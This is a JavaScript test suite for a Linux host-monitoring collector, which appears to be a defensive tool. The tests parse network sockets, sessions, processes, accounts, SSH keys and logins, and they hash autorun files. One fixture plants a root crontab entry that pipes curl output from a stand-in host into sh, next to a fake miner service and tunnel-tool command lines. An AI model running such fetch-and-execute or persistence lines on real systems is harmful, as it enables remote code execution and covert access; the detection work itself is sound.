import test from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import {
  parseSs,
  parseKeygenList,
  parsePasswd,
  parseSshAccepted,
  parseRemoteTools,
  collectLinuxAutoruns,
  collectLinux,
} from "../src/collectors/linux.js";
import { parseWho } from "../src/collectors/who.js";

const posixOnly = { skip: process.platform === "win32" ? "needs POSIX symlinks and permissions" : false };

function sha16(content) {
  return crypto.createHash("sha256").update(content).digest("hex").slice(0, 16);
}

async function makeTree(files) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "tashev-guard-linux-"));
  for (const [relative, spec] of Object.entries(files)) {
    const full = path.join(root, relative);
    await fs.mkdir(path.dirname(full), { recursive: true });
    if (spec && typeof spec === "object" && "symlink" in spec) await fs.symlink(spec.symlink, full);
    else if (spec && typeof spec === "object" && "dir" in spec) await fs.mkdir(full, { recursive: true });
    else await fs.writeFile(full, spec);
  }
  return root;
}

const SS_OUTPUT = [
  'LISTEN     0      4096   127.0.0.53%lo:53          0.0.0.0:*     users:(("systemd-resolve",pid=612,fd=14))',
  'LISTEN     0      511          0.0.0.0:443         0.0.0.0:*     users:(("nginx",pid=1234,fd=6),("nginx",pid=1233,fd=6))',
  'LISTEN     0      128                *:22                *:*     users:(("sshd",pid=123,fd=3),("systemd",pid=1,fd=50))',
  "LISTEN     0      128             [::]:22             [::]:*",
  'LISTEN     0      5          127.0.0.1:7000        0.0.0.0:*     users:(("tmux: server",pid=42,fd=5))',
  'ESTAB      0      0           10.0.0.5:22      203.0.113.7:51234 users:(("sshd",pid=4321,fd=4),("sshd",pid=4300,fd=4))',
  'ESTAB      0      0    [::ffff:10.0.0.5]:443 [::ffff:1.2.3.4]:55555 users:(("node",pid=777,fd=20))',
  "ESTAB      0      0      [2001:db8::5]:22    [2001:db8::9]:40000",
  "TIME-WAIT  0      0           10.0.0.5:443    198.51.100.2:40001",
  'CLOSE-WAIT 1      0           10.0.0.5:5432       10.0.0.9:6000  users:(("postgres",pid=99,fd=9))',
  'SYN-SENT   0      1           10.0.0.5:33333     192.0.2.1:443   users:(("curl",pid=5,fd=3))',
  "",
].join("\n");

test("parseSs keeps only LISTEN and ESTAB rows and maps ESTAB to ESTABLISHED", () => {
  const rows = parseSs(SS_OUTPUT);
  assert.deepEqual(rows.map((row) => row.state), [
    "LISTEN", "LISTEN", "LISTEN", "LISTEN", "LISTEN",
    "ESTABLISHED", "ESTABLISHED", "ESTABLISHED",
  ]);
});

test("parseSs parses IPv4, %iface, wildcard and IPv6 listeners", () => {
  const rows = parseSs(SS_OUTPUT);
  assert.deepEqual(rows[0], {
    state: "LISTEN",
    local: "127.0.0.53%lo:53",
    remote: null,
    localPort: 53,
    pid: 612,
    process: "systemd-resolve",
    endpoint: "127.0.0.53%lo:53",
  });
  assert.deepEqual([rows[1].local, rows[1].localPort, rows[1].process, rows[1].pid], ["0.0.0.0:443", 443, "nginx", 1234]);
  assert.deepEqual([rows[2].local, rows[2].localPort, rows[2].process, rows[2].pid], ["*:22", 22, "sshd", 123]);
  assert.deepEqual(rows[3], {
    state: "LISTEN",
    local: "[::]:22",
    remote: null,
    localPort: 22,
    pid: null,
    process: null,
    endpoint: "[::]:22",
  });
  assert.equal(rows[4].process, "tmux: server");
  assert.equal(rows[4].pid, 42);
});

test("parseSs builds local->remote endpoints for established connections", () => {
  const [ssh, mapped, v6] = parseSs(SS_OUTPUT).filter((row) => row.state === "ESTABLISHED");
  assert.deepEqual(ssh, {
    state: "ESTABLISHED",
    local: "10.0.0.5:22",
    remote: "203.0.113.7:51234",
    localPort: 22,
    pid: 4321,
    process: "sshd",
    endpoint: "10.0.0.5:22->203.0.113.7:51234",
  });
  assert.deepEqual([mapped.local, mapped.localPort, mapped.remote, mapped.process], [
    "[::ffff:10.0.0.5]:443", 443, "[::ffff:1.2.3.4]:55555", "node",
  ]);
  assert.equal(mapped.endpoint, "[::ffff:10.0.0.5]:443->[::ffff:1.2.3.4]:55555");
  assert.deepEqual([v6.localPort, v6.pid, v6.process], [22, null, null]);
  assert.equal(v6.endpoint, "[2001:db8::5]:22->[2001:db8::9]:40000");
});

test("parseSs tolerates a header line, a Netid column and old IPv6 notation", () => {
  const rows = parseSs([
    "State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
    'tcp LISTEN 0 100 0.0.0.0:25 0.0.0.0:* users:(("master",pid=3,fd=13))',
    "LISTEN 0 128 :::80 :::*",
  ].join("\n"));
  assert.deepEqual(rows.map((row) => [row.local, row.localPort, row.process]), [
    ["0.0.0.0:25", 25, "master"],
    [":::80", 80, null],
  ]);
});

test("parseWho keeps only sessions with a remote host (shared by macOS and Linux)", () => {
  const sessions = parseWho([
    "rinat    console  Oct 23 10:00",
    "rinat    ttys000  Oct 23 10:05",
    "rinat    ttys002  Oct 23 10:06 (console)",
    "root     pts/0        2026-10-23 21:24 (203.0.113.7)",
    "bob      pts/1        2026-10-23 21:30 (tmux(1234).%0)",
    "",
  ].join("\n"));
  assert.deepEqual(sessions, [{
    user: "root",
    terminal: "pts/0",
    remoteHost: "203.0.113.7",
    raw: "root     pts/0        2026-10-23 21:24 (203.0.113.7)",
  }]);
});

const PS_OUTPUT = [
  "      1 systemd         /sbin/init splash",
  "    900 sshd            sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
  "   4321 sshd            sshd: root@pts/0",
  "    812 cloudflared     /usr/bin/cloudflared --no-autoupdate tunnel run --token eyJhIjoiZmFrZS10b2tlbiJ9",
  "   1300 tailscaled      /usr/sbin/tailscaled --state=/var/lib/tailscale/tailscaled.state",
  "   1400 node            node /opt/app/server.js",
  "   1500 x11vnc          x11vnc -display :0 -forever -passwd hunter2",
  "   1600 Xtigervnc       /usr/bin/Xtigervnc :1 -desktop host:1",
  "   1700 frpc            /usr/local/bin/frpc -c /etc/frp/frpc.toml",
  "   1800 kworker/0:1     [kworker/0:1]",
].join("\n");

test("parseRemoteTools finds Linux remote-access and tunnel tools, but not sshd", () => {
  const tools = parseRemoteTools(PS_OUTPUT);
  assert.deepEqual(tools.map((tool) => [tool.pid, tool.process]), [
    [812, "cloudflared"],
    [1300, "tailscaled"],
    [1500, "x11vnc"],
    [1600, "Xtigervnc"],
    [1700, "frpc"],
  ]);
  assert.ok(tools.every((tool) => tool.signature === null));
  assert.equal(tools[0].executable, "/usr/bin/cloudflared");
});

test("parseRemoteTools redacts tokens and passwords from command lines", () => {
  const tools = parseRemoteTools(PS_OUTPUT);
  assert.doesNotMatch(tools[0].command, /eyJh/);
  assert.match(tools[0].command, /--token \*\*\*/);
  assert.doesNotMatch(tools[2].command, /hunter2/);

  const [ngrok, chisel, tailscale] = parseRemoteTools([
    "  10 ngrok           ngrok http 80 --authtoken 2abcSecret",
    "  11 chisel          /opt/chisel client --auth admin:s3cret 203.0.113.9:8000 R:socks",
    "  12 tailscaled      /usr/sbin/tailscaled --auth-key=tskey-auth-xyz --tun=userspace-networking",
  ].join("\n"));
  assert.equal(ngrok.command, "ngrok http 80 --authtoken ***");
  assert.equal(chisel.command, "/opt/chisel client --auth *** 203.0.113.9:8000 R:socks");
  assert.equal(tailscale.command, "/usr/sbin/tailscaled --auth-key=*** --tun=userspace-networking");
});

test("parseKeygenList extracts fingerprints, comments with spaces and key types", () => {
  const file = "/root/.ssh/authorized_keys";
  const keys = parseKeygenList([
    "4096 SHA256:z/8/YjQmT1qZ0rKcW1n2b3c4d5e6f7g8h9i0j1k2l3m rinat@MacBook; work laptop (RSA)",
    "256 SHA256:AbCdEf0123456789AbCdEf0123456789AbCdEf01234 deploy key (2026) (ED25519)",
    "256 SHA256:Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq9Qq no comment (ED25519-CERT)",
    "256 SHA256:NoCommentNoCommentNoCommentNoCommentNoComme (ECDSA)",
    "/root/.ssh/authorized_keys is not a public key file.",
    "",
  ].join("\n"), "root", file);
  assert.equal(keys.length, 4);
  assert.deepEqual(keys[0], {
    user: "root",
    file,
    bits: 4096,
    fingerprint: "SHA256:z/8/YjQmT1qZ0rKcW1n2b3c4d5e6f7g8h9i0j1k2l3m",
    comment: "rinat@MacBook; work laptop",
    type: "RSA",
  });
  assert.deepEqual([keys[1].comment, keys[1].type, keys[1].bits], ["deploy key (2026)", "ED25519", 256]);
  assert.deepEqual([keys[2].comment, keys[2].type], ["no comment", "ED25519-CERT"]);
  assert.deepEqual([keys[3].comment, keys[3].type], ["", "ECDSA"]);
});

test("parsePasswd keeps login-shell accounts and every uid 0 account", () => {
  const accounts = parsePasswd([
    "root:x:0:0:root:/root:/bin/bash",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
    "sync:x:4:65534:sync:/bin:/bin/sync",
    "shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown",
    "halt:x:7:0:halt:/sbin:/sbin/halt",
    "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
    "sshd:x:110:65534::/run/sshd:/sbin/nologin",
    "rinat:x:1000:1000:Rinat,,,:/home/rinat:/bin/bash",
    "deploy:x:1001:1001::/home/deploy:/bin/sh",
    "ftp:x:1002:1002::/srv/ftp:/bin/false",
    "svc:x:1003:1003::/srv/svc:/usr/bin/false",
    "toor:x:0:0::/root:/usr/sbin/nologin",
    "# comment line",
    "+@nis-group::::::",
    "broken-line",
    "",
  ].join("\n"));
  assert.deepEqual(accounts, [
    { user: "root", uid: 0, shell: "/bin/bash" },
    { user: "rinat", uid: 1000, shell: "/bin/bash" },
    { user: "deploy", uid: 1001, shell: "/bin/sh" },
    { user: "toor", uid: 0, shell: "/usr/sbin/nologin" },
  ]);
});

const JOURNAL_OUTPUT = [
  "-- Boot 0123456789abcdef --",
  "2026-10-23T21:24:59+00:00 web-1 sshd[123]: Accepted publickey for root from 1.2.3.4 port 5555 ssh2: RSA SHA256:abcDEF",
  "2026-10-23T21:25:10.123456+00:00 web-1 sshd[124]: Accepted password for root from 2001:db8::1 port 4444 ssh2",
  "2026-10-23T21:26:00+0000 web-1 sshd-session[125]: Accepted keyboard-interactive/pam for bob from 1.2.3.4 port 1 ssh2",
  "2026-10-23T21:27:00+00:00 web-1 sshd[126]: Failed password for root from 5.6.7.8 port 22 ssh2",
  "2026-10-23T21:28:00+00:00 web-1 sshd[127]: Invalid user x from 9.9.9.9 port 1: Accepted password for root from 6.6.6.6 port 22 ssh2",
  "2026-10-23T21:29:00+00:00 web-1 sshd[128]: Accepted publickey for deploy from 10.0.0.2 port 2222 ssh2: ED25519-CERT SHA256:certFp ID deploy@ci (serial 7) CA ED25519 SHA256:caFp",
  "-- No entries --",
].join("\n");

test("parseSshAccepted reads publickey, password, keyboard-interactive and IPv6 logins", () => {
  assert.deepEqual(parseSshAccepted(JOURNAL_OUTPUT), [
    { time: "2026-10-23T21:24:59.000Z", user: "root", method: "publickey", ip: "1.2.3.4", port: 5555, keyType: "RSA", fingerprint: "SHA256:abcDEF" },
    { time: "2026-10-23T21:25:10.123Z", user: "root", method: "password", ip: "2001:db8::1", port: 4444, keyType: null, fingerprint: null },
    { time: "2026-10-23T21:26:00.000Z", user: "bob", method: "keyboard-interactive", ip: "1.2.3.4", port: 1, keyType: null, fingerprint: null },
    { time: "2026-10-23T21:29:00.000Z", user: "deploy", method: "publickey", ip: "10.0.0.2", port: 2222, keyType: "ED25519-CERT", fingerprint: "SHA256:certFp" },
  ]);
});

test("parseSshAccepted understands classic auth.log timestamps and the year boundary", () => {
  const now = new Date(2026, 9, 24, 12, 0, 0);
  const [login, early] = parseSshAccepted([
    "Oct 23 21:29:00 web-1 sshd[128]: Accepted publickey for deploy from 10.0.0.2 port 2222 ssh2: ED25519 SHA256:xyz",
    "Oct  3 08:00:01 web-1 sshd[129]: Accepted password for root from 10.0.0.3 port 2223 ssh2",
  ].join("\n"), { now });
  assert.equal(login.time, new Date(2026, 9, 23, 21, 29, 0).toISOString());
  assert.deepEqual([login.user, login.method, login.fingerprint], ["deploy", "publickey", "SHA256:xyz"]);
  assert.equal(early.time, new Date(2026, 9, 3, 8, 0, 1).toISOString());

  const [lastYear] = parseSshAccepted(
    "Dec 31 23:59:00 web-1 sshd[1]: Accepted password for root from 1.1.1.1 port 1 ssh2",
    { now: new Date(2027, 0, 1, 0, 5, 0) }
  );
  assert.equal(lastYear.time, new Date(2026, 11, 31, 23, 59, 0).toISOString());
});

test("collectLinuxAutoruns inventories systemd, cron, boot and sudoers files with content hashes", posixOnly, async () => {
  const evil = "[Service]\nExecStart=/tmp/.x/miner\n";
  const root = await makeTree({
    "etc/systemd/system/evil.service": evil,
    "etc/systemd/system/backup.timer": "[Timer]\nOnCalendar=daily\n",
    "etc/systemd/system/sshd.service": { symlink: "/lib/systemd/system/ssh.service" },
    "etc/systemd/system/dbus-org.freedesktop.resolve1.service": { symlink: "/usr/lib/systemd/system/systemd-resolved.service" },
    "etc/systemd/system/relative-alias.service": { symlink: "../../../lib/systemd/system/foo.service" },
    "etc/systemd/system/masked.service": { symlink: "/dev/null" },
    "etc/systemd/system/multi-user.target.wants/nginx.service": { symlink: "/lib/systemd/system/nginx.service" },
    "etc/systemd/system/ssh.service.d/override.conf": "[Service]\nExecStart=\n",
    "etc/systemd/system/ssh.service.d/notes.txt": "not a drop-in",
    "etc/systemd/system/default.target": "[Unit]\n",
    "etc/systemd/system/README": "docs",
    "root/.config/systemd/user/agent.service": "[Service]\nExecStart=/root/agent\n",
    "etc/crontab": "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
    "etc/cron.d/certbot": "0 */12 * * * root certbot -q renew\n",
    "etc/cron.daily/logrotate": "#!/bin/sh\n",
    "etc/cron.daily/subdir": { dir: true },
    "var/spool/cron/crontabs/root": "* * * * * curl -s http://example.invalid | sh\n",
    "etc/rc.local": "#!/bin/sh\nexit 0\n",
    "etc/ld.so.preload": "",
    "etc/sudoers": "root ALL=(ALL:ALL) ALL\n",
    "etc/sudoers.d/90-cloud-init-users": "ubuntu ALL=(ALL) NOPASSWD:ALL\n",
  });
  try {
    const { autoruns, warnings } = await collectLinuxAutoruns({ root });
    assert.deepEqual(warnings, []);
    assert.deepEqual(autoruns.map((item) => [item.scope, item.name, item.path]), [
      ["cron", "cron.d/certbot", "/etc/cron.d/certbot"],
      ["cron", "cron.daily/logrotate", "/etc/cron.daily/logrotate"],
      ["cron", "crontab", "/etc/crontab"],
      ["boot", "rc.local", "/etc/rc.local"],
      ["sudoers", "sudoers", "/etc/sudoers"],
      ["sudoers", "sudoers.d/90-cloud-init-users", "/etc/sudoers.d/90-cloud-init-users"],
      ["systemd", "backup.timer", "/etc/systemd/system/backup.timer"],
      ["systemd", "evil.service", "/etc/systemd/system/evil.service"],
      ["systemd", "masked.service", "/etc/systemd/system/masked.service"],
      ["systemd", "ssh.service.d/override.conf", "/etc/systemd/system/ssh.service.d/override.conf"],
      ["systemd", "user/agent.service", "/root/.config/systemd/user/agent.service"],
      ["cron", "crontabs/root", "/var/spool/cron/crontabs/root"],
    ]);
    const byPath = new Map(autoruns.map((item) => [item.path, item]));
    assert.equal(byPath.get("/etc/systemd/system/evil.service").hash, sha16(evil));
    assert.equal(byPath.get("/etc/systemd/system/masked.service").hash, sha16(""));
    assert.ok(autoruns.every((item) => /^[0-9a-f]{16}$/.test(item.hash)));

    await fs.writeFile(path.join(root, "etc/systemd/system/evil.service"), evil + "Restart=always\n");
    const again = await collectLinuxAutoruns({ root });
    const edited = again.autoruns.find((item) => item.path === "/etc/systemd/system/evil.service");
    assert.notEqual(edited.hash, byPath.get("/etc/systemd/system/evil.service").hash);
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});

test("collectLinuxAutoruns reports unreadable files and directories as warnings", {
  skip: process.platform === "win32" || process.getuid?.() === 0 ? "needs a non-root POSIX user" : false,
}, async () => {
  const root = await makeTree({
    "etc/sudoers": "root ALL=(ALL:ALL) ALL\n",
    "etc/sudoers.d/90-users": "bob ALL=(ALL) ALL\n",
  });
  const sudoersFile = path.join(root, "etc/sudoers");
  const sudoersDir = path.join(root, "etc/sudoers.d");
  await fs.chmod(sudoersFile, 0o000);
  await fs.chmod(sudoersDir, 0o000);
  try {
    const { autoruns, warnings } = await collectLinuxAutoruns({ root });
    assert.deepEqual(autoruns, [{ scope: "sudoers", name: "sudoers", path: "/etc/sudoers", hash: null }]);
    assert.ok(warnings.some((warning) => warning.includes("/etc/sudoers.d") && warning.includes("EACCES")), warnings.join("\n"));
    assert.ok(warnings.some((warning) => warning.includes("/etc/sudoers ") && warning.includes("EACCES")), warnings.join("\n"));
  } finally {
    await fs.chmod(sudoersDir, 0o755);
    await fs.chmod(sudoersFile, 0o644);
    await fs.rm(root, { recursive: true, force: true });
  }
});

function fakeRunner(outputs, calls) {
  return async (command, args = [], options = {}) => {
    calls.push({ command, args, options });
    const handler = outputs[command];
    if (!handler) return { ok: false, stdout: "", stderr: "not found", code: "ENOENT" };
    return typeof handler === "function" ? handler(args) : handler;
  };
}

const PASSWD = [
  "root:x:0:0:root:/root:/bin/bash",
  "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
  "rinat:x:1000:1000::/home/rinat:/bin/bash",
  "deploy:x:1001:1001::/home/deploy:/bin/bash",
].join("\n");

test("collectLinux assembles a Linux snapshot from ss, who, ps, passwd, ssh-keygen and journalctl", posixOnly, async () => {
  const root = await makeTree({
    "etc/passwd": PASSWD,
    "root/.ssh/authorized_keys": "ssh-ed25519 placeholder owner@laptop\n",
    "home/rinat/.ssh/authorized_keys2": "ssh-rsa placeholder rinat@pc\n",
    "home/deploy/.ssh/authorized_keys": "",
    "var/www/.ssh/authorized_keys": "ssh-ed25519 placeholder ignored-nologin\n",
    "etc/sudoers": "root ALL=(ALL:ALL) ALL\n",
  });
  const calls = [];
  const run = fakeRunner({
    ss: { ok: true, stdout: SS_OUTPUT, stderr: "" },
    who: { ok: true, stdout: "root     pts/0        2026-10-23 21:24 (203.0.113.7)\n", stderr: "" },
    ps: { ok: true, stdout: PS_OUTPUT, stderr: "" },
    journalctl: { ok: true, stdout: JOURNAL_OUTPUT, stderr: "" },
    "ssh-keygen": (args) => {
      const file = args[args.length - 1];
      if (file === path.join(root, "root/.ssh/authorized_keys")) {
        return { ok: true, stdout: "256 SHA256:OwnerKeyOwnerKeyOwnerKeyOwnerKeyOwnerKey123 owner@laptop (ED25519)\n", stderr: "" };
      }
      if (file === path.join(root, "home/rinat/.ssh/authorized_keys2")) {
        return { ok: true, stdout: "4096 SHA256:RinatKeyRinatKeyRinatKeyRinatKeyRinatKey123 rinat@pc (RSA)\n", stderr: "" };
      }
      return { ok: false, stdout: "", stderr: "unexpected file" };
    },
  }, calls);

  try {
    const snapshot = await collectLinux({
      root,
      run,
      isRoot: true,
      since: new Date("2026-10-23T21:25:00Z"),
      now: new Date("2026-10-23T22:00:00Z"),
    });

    assert.equal(snapshot.platform, "linux");
    assert.equal(snapshot.listening.length, 5);
    assert.ok(snapshot.listening.every((row) => row.state === "LISTEN"));
    assert.equal(snapshot.connections.length, 3);
    assert.ok(snapshot.connections.every((row) => row.state === "ESTABLISHED" && row.remote));
    assert.deepEqual(snapshot.remoteSessions.map((session) => session.remoteHost), ["203.0.113.7"]);
    assert.deepEqual(snapshot.remoteTools.map((tool) => tool.process), ["cloudflared", "tailscaled", "x11vnc", "Xtigervnc", "frpc"]);
    assert.deepEqual(snapshot.accounts, [
      { user: "root", uid: 0, shell: "/bin/bash" },
      { user: "rinat", uid: 1000, shell: "/bin/bash" },
      { user: "deploy", uid: 1001, shell: "/bin/bash" },
    ]);
    assert.deepEqual(snapshot.accessKeys, [
      { user: "root", file: "/root/.ssh/authorized_keys", bits: 256, fingerprint: "SHA256:OwnerKeyOwnerKeyOwnerKeyOwnerKeyOwnerKey123", comment: "owner@laptop", type: "ED25519" },
      { user: "rinat", file: "/home/rinat/.ssh/authorized_keys2", bits: 4096, fingerprint: "SHA256:RinatKeyRinatKeyRinatKeyRinatKeyRinatKey123", comment: "rinat@pc", type: "RSA" },
    ]);
    const keygenFiles = calls.filter((call) => call.command === "ssh-keygen").map((call) => call.args.at(-1));
    assert.deepEqual(keygenFiles.sort(), [
      path.join(root, "home/rinat/.ssh/authorized_keys2"),
      path.join(root, "root/.ssh/authorized_keys"),
    ]);

    const journal = calls.find((call) => call.command === "journalctl");
    const sinceSeconds = String(Date.parse("2026-10-23T21:25:00Z") / 1000);
    assert.ok(journal.args.includes("_COMM=sshd"));
    assert.ok(journal.args.includes("@" + sinceSeconds));
    assert.ok(journal.args.includes("short-iso"));
    assert.ok(journal.args.includes("--no-pager"));
    assert.deepEqual(snapshot.sshLogins.map((login) => [login.user, login.method, login.time]), [
      ["root", "password", "2026-10-23T21:25:10.123Z"],
      ["bob", "keyboard-interactive", "2026-10-23T21:26:00.000Z"],
      ["deploy", "publickey", "2026-10-23T21:29:00.000Z"],
    ]);

    assert.ok(snapshot.autoruns.some((item) => item.path === "/etc/sudoers" && item.scope === "sudoers"));
    assert.deepEqual(snapshot.collectorWarnings, []);
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});

test("collectLinux falls back to /var/log/auth.log when journalctl fails", posixOnly, async () => {
  const root = await makeTree({
    "etc/passwd": "root:x:0:0:root:/root:/bin/bash\n",
    "var/log/auth.log": [
      "2026-10-23T20:00:00.000000+00:00 web-1 sshd[1]: Accepted publickey for root from 1.2.3.4 port 1 ssh2: ED25519 SHA256:old",
      "2026-10-23T21:40:00.000000+00:00 web-1 sshd[2]: Accepted publickey for root from 1.2.3.4 port 2 ssh2: ED25519 SHA256:new",
    ].join("\n") + "\n",
  });
  const calls = [];
  const run = fakeRunner({
    ss: { ok: true, stdout: "", stderr: "" },
    who: { ok: true, stdout: "", stderr: "" },
    ps: { ok: true, stdout: "", stderr: "" },
    journalctl: { ok: false, stdout: "", stderr: "No journal files were found.", code: 1 },
  }, calls);
  try {
    const snapshot = await collectLinux({ root, run, isRoot: true, since: new Date("2026-10-23T21:00:00Z") });
    assert.deepEqual(snapshot.sshLogins.map((login) => login.fingerprint), ["SHA256:new"]);
    assert.deepEqual(snapshot.collectorWarnings, []);
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});

test("collectLinux degrades to warnings instead of crashing when tools are missing", posixOnly, async () => {
  const root = await makeTree({ "etc/hostname": "web-1\n" });
  try {
    const snapshot = await collectLinux({ root, run: fakeRunner({}, []), isRoot: false });
    assert.equal(snapshot.platform, "linux");
    for (const key of ["connections", "listening", "remoteSessions", "remoteTools", "autoruns", "accessKeys", "accounts", "sshLogins"]) {
      assert.deepEqual(snapshot[key], [], key);
    }
    const text = snapshot.collectorWarnings.join("\n");
    assert.match(text, /ss unavailable/);
    assert.match(text, /who unavailable/);
    assert.match(text, /ps unavailable/);
    assert.match(text, /\/etc\/passwd/);
    assert.match(text, /SSH logins/);
    assert.match(text, /not running as root/);
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
});
